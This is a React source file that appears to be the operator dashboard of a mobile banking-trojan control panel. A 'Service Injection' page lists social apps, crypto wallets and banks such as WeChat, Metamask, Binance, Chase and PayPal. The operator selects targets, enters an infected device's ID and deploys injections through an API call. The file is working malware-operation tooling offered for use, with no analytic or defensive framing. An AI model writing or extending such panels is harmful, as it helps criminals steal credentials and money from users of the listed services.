import React, { useState } from 'react';
import axios from 'axios';
import { RefreshCw, Syringe } from 'lucide-react';
const CATS = { social: { label: 'SOCIAL', count: 36, color: 'cyan' }, crypto: { label: 'CRYPTO', count: 53, color: 'red' }, finance: { label: 'FINANCE', count: 48, color: 'yellow' } };
const TARGETS = {
  social: [
    { id: 'wechat', name: '微信', icon: '💬' }, { id: 'tiktok', name: 'TikTok', icon: '🎵' },
    { id: 'xiaohongshu', name: '小红书', icon: '📕' }, { id: 'qq', name: 'QQ', icon: '🐧' },
    { id: 'taobao', name: '淘宝', icon: '🛒' }, { id: 'weibo', name: '微博', icon: '👁' },
    { id: 'viber', name: 'Viber', icon: '📞' }, { id: 'vk', name: 'VK', icon: '🔷' },
    { id: 'gmail', name: 'Gmail', icon: '📧' }, { id: 'facebook', name: 'Facebook', icon: 'f' },
    { id: 'instagram', name: 'Instagram', icon: '📷' }, { id: 'discord', name: 'Discord', icon: '🎮' },
    { id: 'snapchat', name: 'Snapchat', icon: '👻' }, { id: 'x', name: 'X', icon: '𝕏' },
    { id: 'pinterest', name: 'Pinterest', icon: '📌' }, { id: 'whatsapp', name: 'WhatsApp', icon: '💚' },
    { id: 'bluesky', name: 'Bluesky', icon: '🦋' }, { id: 'element', name: 'Element', icon: '🔐' }
  ],
  crypto: [
    { id: 'binance', name: 'Binance', icon: '◆' }, { id: 'coinbase', name: 'Coinbase', icon: '◎' },
    { id: 'metamask', name: 'Metamask', icon: '🦊' }, { id: 'bitget', name: 'Bitget', icon: '◈' },
    { id: 'phantom', name: 'Phantom', icon: '👻' }, { id: 'trustwallet', name: 'Trust Wallet', icon: '🔵' },
    { id: 'moonpay', name: 'Moonpay', icon: '🌙' }, { id: 'exodus', name: 'Exodus', icon: '⧫' },
    { id: 'dydx', name: 'DYDX', icon: 'X' }, { id: 'jaxx', name: 'JAXX Liberty', icon: 'J' },
    { id: 'bybit', name: 'Bybit', icon: 'B' }, { id: 'htx', name: 'HTX', icon: 'H' },
    { id: 'okx', name: 'OKX', icon: '◼' }, { id: 'atomic', name: 'Atomic', icon: '⚛' },
    { id: 'blockchain', name: 'Blockchain.com', icon: '⬡' }, { id: 'coinomi', name: 'Coinomi', icon: '◎' },
    { id: 'cryptocom', name: 'Crypto.com', icon: '⬢' }, { id: 'edge', name: 'Edge', icon: '▲' }
  ],
  finance: [
    { id: 'airstar', name: 'AirStar', icon: '✈' }, { id: 'alipay', name: 'Ali Pay', icon: '支' },
    { id: 'boc', name: 'BOC', icon: '🏦' }, { id: 'hsbc', name: 'HSBC Singapore', icon: '◆' },
    { id: 'chase', name: 'Chase', icon: 'C' }, { id: 'revolut', name: 'Revolut', icon: 'R' },
    { id: 'alfabank', name: 'Alfa Bank Belarus', icon: 'A' }, { id: 'paypal', name: 'Paypal', icon: 'P' },
    { id: 'googlewallet', name: 'Google Wallet', icon: 'G' }, { id: 'samsungwallet', name: 'Samsung Wallet', icon: 'S' },
    { id: 'allybank', name: 'AllyBank', icon: '◆' }, { id: 'bluevine', name: 'BluevineBank', icon: 'B' },
    { id: 'capitalone', name: 'CapitalOne', icon: 'C' }, { id: 'chime', name: 'ChimeBank', icon: '◈' },
    { id: 'creditone', name: 'CreditOne', icon: '◉' }, { id: 'currencyfair', name: 'CurrencyFair', icon: '⚖' },
    { id: 'discover', name: 'DiscoverBank', icon: 'D' }, { id: 'greenfi', name: 'GREENFI', icon: 'F' }
  ]
};
export default function Injections() {
  const [tab, setTab] = useState('social');
  const [sel, setSel] = useState(new Set());
  const [deviceId, setDeviceId] = useState('');
  const toggle = (id) => { const n = new Set(sel); n.has(id) ? n.delete(id) : n.add(id); setSel(n); };
  const deploy = async () => { if (!deviceId || sel.size === 0) return; await axios.post(`/api/injections/${deviceId}`, { targets: Array.from(sel), category: tab }); setSel(new Set()); };
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between"><div className="flex items-center gap-3"><Syringe size={20} className="text-cyan-400"/><h1 className="text-xl font-bold text-white">Service Injection</h1></div><button className="flex items-center gap-2 px-4 py-2 bg-wuzen-card border border-wuzen-border rounded-lg text-xs text-wuzen-muted hover:text-white hover:border-cyan-500 transition-all"><RefreshCw size={14}/> REFRESH</button></div>
      <div className="flex gap-4 border-b border-wuzen-border pb-1">
        {Object.entries(CATS).map(([k,c]) => (<button key={k} onClick={()=>{setTab(k);setSel(new Set());}} className={`px-4 py-2 text-xs font-mono font-bold transition-all relative ${tab===k?'text-white':'text-wuzen-muted hover:text-white'}`}>{c.label}<span className={`ml-2 px-1.5 py-0.5 rounded text-[10px] ${tab===k?`bg-${c.color}-500/20 text-${c.color}-400`:'bg-gray-800 text-gray-500'}`}>{c.count}</span>{tab===k && <div className={`absolute bottom-0 left-0 right-0 h-0.5 bg-${c.color}-400`}/>}</button>))}
        <button className="px-4 py-2 text-xs font-mono text-wuzen-muted hover:text-white transition-all">⚡ INJECTION RESULTS</button>
      </div>
      <div className="grid grid-cols-3 gap-4">
        {TARGETS[tab].map(t => { const s = sel.has(t.id); return <div key={t.id} onClick={()=>toggle(t.id)} className={`flex items-center justify-between p-4 bg-wuzen-card border rounded-xl cursor-pointer transition-all ${s?'border-cyan-400 shadow-lg shadow-cyan-500/20':'border-wuzen-border hover:border-gray-600'}`}><div className="flex items-center gap-3"><div className={`w-10 h-10 rounded-lg flex items-center justify-center text-lg ${s?'bg-cyan-500/20 text-cyan-400':'bg-gray-800 text-gray-400'}`}>{t.icon}</div><span className="text-sm text-white font-medium">{t.name}</span></div><div className={`w-5 h-5 rounded border-2 flex items-center justify-center transition-all ${s?'bg-cyan-400 border-cyan-400':'border-gray-600'}`}>{s && <span className="text-wuzen-bg text-xs font-bold">✓</span>}</div></div>; })}
      </div>
      <div className="flex items-center gap-4"><input type="text" placeholder="Device ID..." value={deviceId} onChange={e=>setDeviceId(e.target.value)} className="px-4 py-2 bg-wuzen-card border border-wuzen-border rounded-lg text-sm text-white focus:border-cyan-500 focus:outline-none"/><button onClick={deploy} disabled={!deviceId||sel.size===0} className="px-6 py-2 bg-cyan-500 hover:bg-cyan-400 disabled:bg-gray-700 disabled:cursor-not-allowed text-wuzen-bg font-bold rounded-lg transition-all">DEPLOY ({sel.size})</button></div>
    </div>
  );
}